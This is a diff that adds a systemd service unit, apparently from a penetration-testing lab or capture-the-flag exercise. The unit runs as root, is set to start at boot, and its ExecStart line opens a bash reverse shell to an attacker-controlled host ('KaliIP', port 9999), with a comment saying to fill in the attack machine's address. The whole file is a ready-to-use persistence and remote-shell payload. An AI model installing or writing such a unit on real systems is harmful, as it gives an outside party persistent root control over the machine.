@@ -1,0 +1,11 @@
+[Unit]
+Description=roooooooooot
+
+[Service]
+Type=simple
+User=root
+#change ip and port to attack machine
+ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/KaliIP/9999 0>&1'
+
+[Install]
+WantedBy=multi-user.target
